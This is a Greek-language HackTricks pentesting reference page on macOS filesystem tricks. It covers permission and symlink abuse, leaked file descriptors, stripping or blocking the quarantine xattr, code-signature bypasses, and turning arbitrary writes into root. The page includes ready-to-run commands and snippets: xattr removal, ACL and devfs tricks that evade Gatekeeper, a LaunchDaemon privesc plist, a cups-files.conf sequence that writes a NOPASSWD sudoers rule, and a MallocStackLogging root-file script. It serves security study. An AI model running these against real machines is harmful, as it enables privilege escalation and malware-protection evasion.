# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Συνδυασμοί δικαιωμάτων POSIX

Δικαιώματα σε έναν **φάκελο**:

- **ανάγνωση** - μπορείτε να **καταμετρήσετε** τις καταχωρίσεις του φακέλου
- **εγγραφή** - μπορείτε να **διαγράψετε/γράψετε** **αρχεία** στον φάκελο και μπορείτε να **διαγράψετε κενές φακέλους**.
- Αλλά δεν μπορείτε να **διαγράψετε/τροποποιήσετε μη κενές φακέλους** εκτός αν έχετε δικαιώματα εγγραφής πάνω τους.
- Δεν μπορείτε να **τροποποιήσετε το όνομα ενός φακέλου** εκτός αν τον κατέχετε.
- **εκτέλεση** - έχετε **δικαίωμα να διασχίσετε** τον φάκελο - αν δεν έχετε αυτό το δικαίωμα, δεν μπορείτε να έχετε πρόσβαση σε κανένα αρχείο μέσα σε αυτόν, ή σε οποιουσδήποτε υποφακέλους.

### Επικίνδυνοι Συνδυασμοί

**Πώς να αντικαταστήσετε ένα αρχείο/φάκελο που ανήκει στον root**, αλλά:

- Ένας γονικός **ιδιοκτήτης φακέλου** στη διαδρομή είναι ο χρήστης
- Ένας γονικός **ιδιοκτήτης φακέλου** στη διαδρομή είναι μια **ομάδα χρηστών** με **δικαιώματα εγγραφής**
- Μια **ομάδα χρηστών** έχει **δικαιώματα εγγραφής** στο **αρχείο**

Με οποιονδήποτε από τους προηγούμενους συνδυασμούς, ένας επιτιθέμενος θα μπορούσε να **εισάγει** έναν **συμβολικό/σκληρό σύνδεσμο** στην αναμενόμενη διαδρομή για να αποκτήσει προνομιακή αυθαίρετη εγγραφή.

### Ειδική περίπτωση φακέλου root R+X

Αν υπάρχουν αρχεία σε έναν **φάκελο** όπου **μόνο ο root έχει πρόσβαση R+X**, αυτά **δεν είναι προσβάσιμα σε κανέναν άλλο**. Έτσι, μια ευπάθεια που επιτρέπει να **μετακινήσετε ένα αρχείο που είναι αναγνώσιμο από έναν χρήστη**, το οποίο δεν μπορεί να διαβαστεί λόγω αυτού του **περιορισμού**, από αυτόν τον φάκελο **σε έναν διαφορετικό**, θα μπορούσε να καταχραστεί για να διαβάσει αυτά τα αρχεία.

Παράδειγμα σε: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Συμβολικός Σύνδεσμος / Σκληρός Σύνδεσμος

### Επιτρεπτικό αρχείο/φάκελος

Αν μια προνομιακή διαδικασία γράφει δεδομένα σε **αρχείο** που θα μπορούσε να είναι **ελεγχόμενο** από έναν **χρήστη με χαμηλότερα προνόμια**, ή που θα μπορούσε να έχει **δημιουργηθεί προηγουμένως** από έναν χρήστη με χαμηλότερα προνόμια. Ο χρήστης θα μπορούσε απλά να **δείξει σε ένα άλλο αρχείο** μέσω ενός Συμβολικού ή Σκληρού συνδέσμου, και η προνομιακή διαδικασία θα γράψει σε αυτό το αρχείο.

Ελέγξτε σε άλλες ενότητες όπου ένας επιτιθέμενος θα μπορούσε να **καταχραστεί μια αυθαίρετη εγγραφή για να κλιμακώσει τα προνόμια**.

### Ανοιχτό `O_NOFOLLOW`

Η σημαία `O_NOFOLLOW` όταν χρησιμοποιείται από τη συνάρτηση `open` δεν θα ακολουθήσει έναν συμβολικό σύνδεσμο στο τελευταίο συστατικό της διαδρομής, αλλά θα ακολουθήσει την υπόλοιπη διαδρομή. Ο σωστός τρόπος για να αποτρέψετε την ακολουθία συμβολικών συνδέσμων στη διαδρομή είναι να χρησιμοποιήσετε τη σημαία `O_NOFOLLOW_ANY`.

## .fileloc

Αρχεία με επέκταση **`.fileloc`** μπορούν να δείχνουν σε άλλες εφαρμογές ή δυαδικά, έτσι όταν ανοίγουν, η εφαρμογή/δυαδικό θα είναι αυτό που θα εκτελείται.\
Παράδειγμα:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Αν μια κλήση στο `open` δεν έχει την σημαία `O_CLOEXEC`, ο περιγραφέας αρχείου θα κληρονομηθεί από τη διαδικασία παιδί. Έτσι, αν μια προνομιακή διαδικασία ανοίξει ένα προνομιακό αρχείο και εκτελέσει μια διαδικασία που ελέγχεται από τον επιτιθέμενο, ο επιτιθέμενος θα **κληρονομήσει τον FD πάνω στο προνομιακό αρχείο**.

Αν μπορείτε να κάνετε μια **διαδικασία να ανοίξει ένα αρχείο ή έναν φάκελο με υψηλά προνόμια**, μπορείτε να εκμεταλλευτείτε το **`crontab`** για να ανοίξετε ένα αρχείο στο `/etc/sudoers.d` με **`EDITOR=exploit.py`**, έτσι ώστε το `exploit.py` να αποκτήσει τον FD στο αρχείο μέσα στο `/etc/sudoers` και να το εκμεταλλευτεί.

Για παράδειγμα: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), κώδικας: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Avoid quarantine xattrs tricks

### Remove it
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Αν ένα αρχείο/φάκελος έχει αυτό το αμετάβλητο χαρακτηριστικό, δεν θα είναι δυνατή η προσθήκη xattr σε αυτό.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Ένα **devfs** mount **δεν υποστηρίζει xattr**, περισσότερες πληροφορίες στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Αυτή η ACL αποτρέπει την προσθήκη `xattrs` στο αρχείο
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** μορφή αρχείου αντιγράφει ένα αρχείο συμπεριλαμβανομένων των ACEs του.

Στον [**κώδικα πηγής**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατόν να δούμε ότι η κείμενη αναπαράσταση ACL που αποθηκεύεται μέσα στο xattr που ονομάζεται **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Έτσι, αν συμπίεσες μια εφαρμογή σε ένα αρχείο zip με μορφή αρχείου **AppleDouble** με ένα ACL που αποτρέπει την εγγραφή άλλων xattrs σε αυτό... το xattr καραντίνας δεν ορίστηκε στην εφαρμογή:

Έλεγξε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Για να το αναπαραγάγουμε, πρώτα πρέπει να αποκτήσουμε τη σωστή συμβολοσειρά acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Παράκαμψη ελέγχων υπογραφής

### Παράκαμψη ελέγχων πλατφορμών

Ορισμένοι έλεγχοι ασφαλείας ελέγχουν αν το δυαδικό αρχείο είναι **δυαδικό αρχείο πλατφόρμας**, για παράδειγμα για να επιτρέψουν τη σύνδεση σε μια υπηρεσία XPC. Ωστόσο, όπως εκτίθεται σε μια παράκαμψη στο https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, είναι δυνατόν να παρακαμφθεί αυτός ο έλεγχος αποκτώντας ένα δυαδικό αρχείο πλατφόρμας (όπως το /bin/ls) και να εισαχθεί η εκμετάλλευση μέσω dyld χρησιμοποιώντας μια μεταβλητή περιβάλλοντος `DYLD_INSERT_LIBRARIES`.

### Παράκαμψη σημαιών `CS_REQUIRE_LV` και `CS_FORCED_LV`

Είναι δυνατόν για ένα εκτελούμενο δυαδικό αρχείο να τροποποιήσει τις δικές του σημαίες για να παρακάμψει τους ελέγχους με έναν κώδικα όπως:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Τα πακέτα περιέχουν το αρχείο **`_CodeSignature/CodeResources`** το οποίο περιέχει το **hash** κάθε μεμονωμένου **αρχείου** στο **πακέτο**. Σημειώστε ότι το hash του CodeResources είναι επίσης **ενσωματωμένο στο εκτελέσιμο**, οπότε δεν μπορούμε να ασχοληθούμε με αυτό, επίσης.

Ωστόσο, υπάρχουν κάποια αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί, αυτά έχουν το κλειδί omit στο plist, όπως:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Είναι δυνατόν να υπολογίσετε την υπογραφή ενός πόρου από το cli με:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Ένας χρήστης μπορεί να τοποθετήσει ένα προσαρμοσμένο dmg που έχει δημιουργηθεί ακόμη και πάνω από ορισμένους υπάρχοντες φακέλους. Έτσι μπορείτε να δημιουργήσετε ένα προσαρμοσμένο πακέτο dmg με προσαρμοσμένο περιεχόμενο:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Συνήθως, το macOS τοποθετεί δίσκους επικοινωνώντας με την υπηρεσία Mach `com.apple.DiskArbitration.diskarbitrationd` (παρέχεται από το `/usr/libexec/diskarbitrationd`). Αν προσθέσετε την παράμετρο `-d` στο αρχείο plist των LaunchDaemons και κάνετε επανεκκίνηση, θα αποθηκεύει τα αρχεία καταγραφής στο `/var/log/diskarbitrationd.log`.\
Ωστόσο, είναι δυνατόν να χρησιμοποιήσετε εργαλεία όπως το `hdik` και το `hdiutil` για να επικοινωνήσετε απευθείας με το kext `com.apple.driver.DiskImages`.

## Αυθαίρετες Εγγραφές

### Περιοδικά sh scripts

Αν το script σας μπορεί να ερμηνευθεί ως **shell script**, μπορείτε να αντικαταστήσετε το **`/etc/periodic/daily/999.local`** shell script που θα ενεργοποιείται κάθε μέρα.

Μπορείτε να **προσομοιώσετε** μια εκτέλεση αυτού του script με: **`sudo periodic daily`**

### Daemons

Γράψτε μια αυθαίρετη **LaunchDaemon** όπως **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** με ένα plist που εκτελεί ένα αυθαίρετο script όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Απλά δημιουργήστε το σενάριο `/Applications/Scripts/privesc.sh` με τις **εντολές** που θα θέλατε να εκτελέσετε ως root.

### Sudoers File

Αν έχετε **τυχαία εγγραφή**, θα μπορούσατε να δημιουργήσετε ένα αρχείο μέσα στον φάκελο **`/etc/sudoers.d/`** παραχωρώντας στον εαυτό σας **sudo** δικαιώματα.

### PATH files

Το αρχείο **`/etc/paths`** είναι ένα από τα κύρια μέρη που γεμίζουν τη μεταβλητή περιβάλλοντος PATH. Πρέπει να είστε root για να το αντικαταστήσετε, αλλά αν ένα σενάριο από **privileged process** εκτελεί κάποια **εντολή χωρίς την πλήρη διαδρομή**, μπορεί να είστε σε θέση να **παρακάμψετε** αυτό τροποποιώντας αυτό το αρχείο.

Μπορείτε επίσης να γράψετε αρχεία στο **`/etc/paths.d`** για να φορτώσετε νέους φακέλους στη μεταβλητή περιβάλλοντος `PATH`.

### cups-files.conf

Αυτή η τεχνική χρησιμοποιήθηκε σε [αυτή την αναφορά](https://www.kandji.io/blog/macos-audit-story-part1).

Δημιουργήστε το αρχείο `/etc/cups/cups-files.conf` με το παρακάτω περιεχόμενο:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Αυτό θα δημιουργήσει το αρχείο `/etc/sudoers.d/lpe` με δικαιώματα 777. Το επιπλέον περιεχόμενο στο τέλος είναι για να ενεργοποιήσει τη δημιουργία αρχείου καταγραφής σφαλμάτων.

Στη συνέχεια, γράψτε στο `/etc/sudoers.d/lpe` την απαραίτητη ρύθμιση για την κλιμάκωση δικαιωμάτων όπως `%staff ALL=(ALL) NOPASSWD:ALL`.

Στη συνέχεια, τροποποιήστε το αρχείο `/etc/cups/cups-files.conf` ξανά υποδεικνύοντας `LogFilePerm 700` ώστε το νέο αρχείο sudoers να γίνει έγκυρο καλώντας το `cupsctl`.

### Sandbox Escape

Είναι δυνατόν να ξεφύγετε από το sandbox του macOS με μια FS αυθαίρετη εγγραφή. Για μερικά παραδείγματα, ελέγξτε τη σελίδα [macOS Auto Start](../../../../macos-auto-start-locations.md) αλλά ένα κοινό είναι να γράψετε ένα αρχείο προτιμήσεων Terminal στο `~/Library/Preferences/com.apple.Terminal.plist` που εκτελεί μια εντολή κατά την εκκίνηση και να το καλέσετε χρησιμοποιώντας το `open`.

## Generate writable files as other users

Αυτό θα δημιουργήσει ένα αρχείο που ανήκει στον root και είναι εγ writable από εμένα ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Αυτό μπορεί επίσης να λειτουργήσει ως privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**POSIX shared memory** επιτρέπει στις διεργασίες σε λειτουργικά συστήματα συμβατά με POSIX να έχουν πρόσβαση σε μια κοινή περιοχή μνήμης, διευκολύνοντας ταχύτερη επικοινωνία σε σύγκριση με άλλες μεθόδους επικοινωνίας μεταξύ διεργασιών. Περιλαμβάνει τη δημιουργία ή το άνοιγμα ενός αντικειμένου κοινής μνήμης με `shm_open()`, την ρύθμιση του μεγέθους του με `ftruncate()`, και την αντιστοίχιση του στη διεύθυνση μνήμης της διεργασίας χρησιμοποιώντας `mmap()`. Οι διεργασίες μπορούν στη συνέχεια να διαβάζουν και να γράφουν απευθείας σε αυτήν την περιοχή μνήμης. Για τη διαχείριση ταυτόχρονων προσβάσεων και την αποφυγή διαφθοράς δεδομένων, χρησιμοποιούνται συχνά μηχανισμοί συγχρονισμού όπως οι mutexes ή οι semaphores. Τέλος, οι διεργασίες αποδεσμεύουν και κλείνουν την κοινή μνήμη με `munmap()` και `close()`, και προαιρετικά αφαιρούν το αντικείμενο μνήμης με `shm_unlink()`. Αυτό το σύστημα είναι ιδιαίτερα αποτελεσματικό για αποδοτική, γρήγορη IPC σε περιβάλλοντα όπου πολλές διεργασίες χρειάζεται να έχουν γρήγορη πρόσβαση σε κοινά δεδομένα.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Παράδειγμα Κώδικα Καταναλωτή</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** είναι μια λειτουργία ασφαλείας που εισήχθη στο macOS για να ενισχύσει την ασφάλεια και την αξιοπιστία των **λειτουργιών περιγραφής αρχείων** σε εφαρμογές χρήστη. Αυτοί οι προστατευμένοι περιγραφείς παρέχουν έναν τρόπο για να συσχετίσουν συγκεκριμένους περιορισμούς ή "φύλακες" με περιγραφείς αρχείων, οι οποίοι επιβάλλονται από τον πυρήνα.

Αυτή η λειτουργία είναι ιδιαίτερα χρήσιμη για την πρόληψη ορισμένων κατηγοριών ευπαθειών ασφαλείας όπως η **μη εξουσιοδοτημένη πρόσβαση σε αρχεία** ή οι **συνθήκες αγώνα**. Αυτές οι ευπάθειες συμβαίνουν όταν, για παράδειγμα, ένα νήμα έχει πρόσβαση σε μια περιγραφή αρχείου δίνοντας **σε ένα άλλο ευάλωτο νήμα πρόσβαση σε αυτήν** ή όταν ένας περιγραφέας αρχείου είναι **κληρονομούμενος** από μια ευάλωτη διεργασία παιδί. Ορισμένες συναρτήσεις που σχετίζονται με αυτή τη λειτουργικότητα είναι:

- `guarded_open_np`: Άνοιγμα ενός FD με φύλακα
- `guarded_close_np`: Κλείσιμο του
- `change_fdguard_np`: Αλλαγή σημαιών φύλακα σε έναν περιγραφέα (ακόμη και αφαίρεση της προστασίας φύλακα)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
